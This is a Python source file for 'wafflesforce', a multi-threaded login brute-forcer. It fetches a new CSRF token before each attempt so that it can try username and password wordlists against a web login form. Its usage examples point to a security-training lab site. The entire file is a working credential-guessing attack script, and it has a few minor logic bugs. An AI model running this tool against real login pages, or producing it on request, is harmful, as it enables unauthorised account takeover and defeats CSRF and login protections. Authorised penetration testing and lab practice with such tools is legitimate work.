#!/usr/bin/env python3 
# Made By WafflesExploits
import concurrent.futures
from http.client import responses
import time
import requests
import re
import urllib
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import logging
logging.getLogger("urllib").setLevel(logging.ERROR)
## Define colors
yellow = "\033[33m"
white = "\033[37m"
red = "\033[31m"
light_blue = "\033[0;34m"
light_green = "\033[32m"
cyan = "\033[36m"
gold_rgb = "\033[38;2;243;164;53m"

# Banner
print(gold_rgb + "╦ ╦╔═╗╔═╗╔═╗╦  ╔═╗╔═╗╔═╗╔═╗╦═╗╔═╗╔═╗")
print("║║║╠═╣╠╣ ╠╣ ║  ║╣ ╚═╗╠╣ ║ ║╠╦╝║  ║╣ ")
print("╚╩╝╩ ╩╚  ╚  ╩═╝╚═╝╚═╝╚  ╚═╝╩╚═╚═╝╚═╝"+ white)

basic_example = f"""\n{cyan}[Usage Example]{white}\npython3 wafflesforce.py --host "https://web-security-academy.net/login" --data 'username=*USER*&password=*PASS*' -U 'users.txt' -P 'passwords.txt' -mr '/login2' -ms '200-299,301,302' --csrf-param 'csrf' --csrf-regex 'name="csrf" value="(.*?)">' --threads 5 --output results.txt\n"""
csrf_get_example = f"""\n{cyan}[Using CSRF URL Example]{white}\npython3 wafflesforce.py --host "https://web-security-academy.net/login" --data 'username=*USER*&password=*PASS*' -U 'users.txt' -P 'passwords.txt' -mr '/login2' -ms '200-299,301,302' --csrf-param 'csrf' --csrf-regex 'name="csrf" value="(.*?)">' --threads 5 --csrf-url "https://web-security-academy.net/login" --output results.txt"""

parser = argparse.ArgumentParser(description='-> Multi-threaded Login Bruteforcer for Bypassing CSRF Token Protection\n ', formatter_class=argparse.RawTextHelpFormatter,epilog=(basic_example + "\n" + csrf_get_example))
parser.add_argument('--host', type=str, help="Target URL.")
parser.add_argument('-U', '--users', type=str, nargs='?', help="Path to usernames\' wordlist file.")
parser.add_argument('-u', '--user', type=str, nargs='?', help="Specify one username to use.")
parser.add_argument('-P', '--passwords', type=str, nargs='?', help="Path to passwords\' wordlist file.")
parser.add_argument('-p', '--password', type=str, nargs='?', help="Specify one password to use.")
parser.add_argument('-cr','--csrf-regex', type=str, help="Specify Regex pattern to extract CSRF Token. Example:'name=\"csrf\" value=\"(.*?)\">'")
parser.add_argument('-cp','--csrf-param', type=str, help="Specify Regex pattern to extract CSRF Token. Example:'csrf'")
parser.add_argument('-cu','--csrf-url', type=str, nargs='?', help="URL Path to csrf token.")
parser.add_argument('-mr','--match-regex', type=str, nargs='?', help="Match specified Regex pattern. Example:'/login2'")
parser.add_argument('-ms','--match-status', type=str, nargs='?', help="Match specified Status codes. Default:'200-299,301,302'", default='200-299,301,302')
parser.add_argument('-d', '--data', type=str, nargs='?', help="Body parameters for POST request. Example:'username=*USER*&password=*PASS*'")
parser.add_argument('-q', '--query', type=str, nargs='?', help="Query parameters for GET request.")
parser.add_argument('-t', '--threads', type=int, nargs='?',help="Number of threads to use. Default: 5", default=5)
parser.add_argument('-o', '--output', type=str, nargs='?',help="Outputs results to a file.")
parser.add_argument('-vr', '--verify',action='store_true', help='Set verify to false. Use if the website doesn\'t use SSL.')
parser.add_argument( '--verbose',action='store_true', help='Increase Verbosity.', default=False)

args = parser.parse_args()

# Parameters
url = args.host
threads = args.threads # Number of threads to run
output = args.output
verify = not(args.verify)
usernames_file = args.users
username = args.user
passwords_file = args.passwords
password = args.password
data = args.data
query = args.query
csrf_url = args.csrf_url
csrf_regex_pattern = args.csrf_regex
csrf_param_name = args.csrf_param
match_regex_pattern = args.match_regex
match_status = args.match_status
verbose = args.verbose

# Declaring Global Variables
debug = False
user_list = ''
user_num = 0
pass_list = ''
pass_num = ''
output_string = ''
use_username_wordlist = False
use_password_wordlist = False
tries_num = 0

# Functions
def print_error(message):
    print(f"{red}[ERROR]{white} - {message}")
    sys.exit()

def print_info(message):
    print(f"{cyan}[Info]{white} - {message}")

def print_input(message):
    return input(f"{yellow}[Choice]{white} - {message}")

def print_sucess(message):
    print(f"{light_green}[Sucess]{white} - {message}")

def POST_Request(login_url, form_data, cookies1):
    res = requests.post(login_url, data=form_data, verify=verify, allow_redirects=False, cookies=cookies1)
    return res

def GET_Request(login_url):
    res = requests.get(login_url, verify=verify)
    return res

def match_regex(pattern, data): # Matches text from data based on regex pattern.
    response = bool(re.findall(pattern, data))
    return response

def get_csrf_token():
    try:
        csrf_url1 = ''
        if(csrf_url): # Check if CSRF URL Exists
            csrf_url1 = csrf_url
        else:
            csrf_url1 = url

        get_response = GET_Request(csrf_url1)
        cookie = get_response.cookies
        csrf_token = re.findall(csrf_regex_pattern,get_response.text)
        results = [cookie, csrf_token[0]]
        if(debug): print(results) # Debug show cookies
        return results
    except Exception as e:
        if(debug): print("Error"+str(e))
        print_error(f"Couldn't Get CSRF Token. GET Request status code: [{str(get_response.status_code)}]") 

def urlencode(string1):
    return urllib.parse.quote_plus(string1)

def create_form_data(user1, password1, data1, csrf_token1):
    data1 = substitute_form_credentials(data1, urlencode(user1), urlencode(password1))
    data1 = data1 + f"&{csrf_param_name}={urlencode(csrf_token1)}"
    form_data = convert_to_form_data(data1)
    return form_data

def substitute_form_credentials(data1, user1, password1):
    try:
        data1 = re.sub('\*USER\*', user1, data1)
        data1 = re.sub('\*PASS\*', password1, data1)
    except Exception as e:
        print_error("Couldn't find *USER* or *PASS* in your --data flag.")
        print(f"{light_green}[Correct Example]{white} -> --data 'user=*USER*&pass=*PASS*'")
    return data1

def convert_to_form_data(data1):
    return dict(item.split("=") for item in data1.split("&"))

def get_status_code(status_string):
    status1 = []
    var1 = status_string.split(",")
    for str1 in var1:
        if ("-" in str1):
            tmp_list = str1.split("-")
            start = int(tmp_list[0])
            end = int(tmp_list[1])
            for i in range(start, end+1):
                status1.append(i)
        else:
            status1.append(int(str1))
            
    return status1

def get_stat_color(stat_code):
    color_code = ''
    if ( 200 <= stat_code < 299):
        color_code = '\033[32m'
    elif ( stat_code == 302):
        color_code = '\033[32m'
    elif ( 300 <= stat_code < 399):
        color_code = '\033[34m'
    elif ( 400 <= stat_code < 499):
        color_code = '\033[33m'
    elif ( 500 <= stat_code < 599):
        color_code = '\033[31m'
    
    colored_stat = color_code + str(stat_code) + white
    return colored_stat

def check_response(response1, post_response_text1, output_string1, stat1):
    if(response1):
        print_sucess(output_string1)
        if (output): 
            file = open(output, "w+")
            file.write(output_string1)
            file.close()
        if verbose: print_info("Response text: \n"+post_response_text1)
    else:
        if(verbose):
            print(f"{red}[Failed attempt {stat1}]{white}")
def attempt_login(username1, password1):
    global tries_num
    tries_num = tries_num + 1
    # Get Session Cookie and Add CSRF Token to the Body data
    result1 = get_csrf_token()
    csrf_token = result1[1]
    csrf_cookie = result1[0]
    param = create_form_data(username1, password1, data, csrf_token)
    # Send the POST Request
    post_response = POST_Request(url,param,csrf_cookie)
    post_response_text = str(post_response.headers) + str(post_response.text)

    stat_code = post_response.status_code
    colored_stat = get_stat_color(int(stat_code))
    output_string = f"Login {username1}:{password1} - [{colored_stat}]"
    
    if(match_regex_pattern and match_status):
        if(stat_code in match_status):
            match_response = match_regex(match_regex_pattern,post_response_text)
            check_response(match_response, post_response_text, output_string, str(stat_code))
    elif(match_regex_pattern):
            match_regex(match_regex_pattern,post_response_text)
            check_response(match_response, post_response_text, output_string, str(stat_code))
    elif(match_status):
        if(stat_code in match_status):
            print_sucess(output_string)

def create_threads(user_list1, pass_list1, executor1, attack_type):
    if(attack_type == 'up'):
        for username1 in user_list1:
            for password1 in pass_list1:
                executor1.submit(attempt_login, username1, password1)
    if(attack_type == 'p'):
        for password1 in pass_list1:
            executor1.submit(attempt_login, user_list1, password1)
    if(attack_type == 'u'):
        for username1 in user_list1:
            executor1.submit(attempt_login, username1, pass_list1)

def start_attack():
    # event = Event() Useful For pausing threads
    with ThreadPoolExecutor(max_workers=threads) as executor:
        if(use_password_wordlist and use_username_wordlist):
            create_threads(user_list,pass_list, executor, 'up')
        elif(use_password_wordlist and not(use_username_wordlist)):
            create_threads(username,pass_list, executor, 'p')
        elif(use_username_wordlist and not(use_password_wordlist)):
            create_threads(user_list,password, executor, 'u')
        else:
            print_info("You selected 1 username and 1 password.")
            times_to_send_request = int(print_input("How many times you want to send this request? "))
            for i in range(0, times_to_send_request):
                executor.submit(attempt_login, username, password)

def text_get_user():
    if(usernames_file):
        return f"{cyan}[Username Wordlist]{white} - '{usernames_file}'"
    else:
        return f"{cyan}[Username]{white} - '{username}'"

def text_get_password():
    if(passwords_file):
        return f"{cyan}[Password Wordlist]{white} - '{passwords_file}'"
    else:
        return f"{cyan}[Password]{white} - '{password}'"

def text_get_csrf_url():
    if(csrf_url):
        return f"{cyan}[CSRF URL]{white} - '{csrf_url}'"

# Checks
if ((data == None) and (query == None)): # POST/GET check
    print_error("You must use either the flag --data (POST Request) or --query (GET Request).")
if ((usernames_file == None) and (username == None)): # username wordlist/username check
    print_error("No username or username wordlist set.")
if ((passwords_file == None) and (password == None)): # password wordlist/password check
    print_error("No password or password wordlist set.")
if (not(match_status) and not(match_status)):
    print_error("You need to specify either --match-status or --match-regex.")
    sys.exit()
if(usernames_file):
    use_username_wordlist = True
    with open(usernames_file) as f:
        user_list = re.sub('\n$', '', f.read()) # Reads File and removes last \n character
    user_list = user_list.split('\n')# Transforms file into a list ['user1','user2',..]    	
    user_num = len(user_list)
if(passwords_file):
    use_password_wordlist = True
    with open(passwords_file) as f:
        pass_list = re.sub('\n$', '', f.read()) # Reads File and removes last \n character
    pass_list = pass_list.split('\n')# Transforms file into a list ['pass1','pass2',..]    	
    pass_num = len(pass_list)
if(match_status): # Get Valid Status code
    match_status = get_status_code(match_status)

# Start Timer
currentDate = str(datetime.now().strftime('%d/%m/%Y/ - %H:%M:%S'))
StartTime = time.perf_counter()

# Program Start
print(f"{gold_rgb}[Starting]{white} {currentDate}")
print(f"{cyan}[Settings]{white}\n {cyan}[URL]{white} - '{url}'\n {text_get_csrf_url()}\n {text_get_user()}\n {text_get_password()}\n {cyan}[Status Code]{white} - {args.match_status}\n {cyan}[Threads]{white} - {threads} ")
if (output):
	print(f" {cyan}[Output]{white} - '{output}'")
start_attack()
print_info(f"Attempts: {tries_num}")

# Stop Timer
EndTime = time.perf_counter()
RunTime = EndTime - StartTime
print(f"{gold_rgb}[Finished]{white} in {round(RunTime, 3)}s")
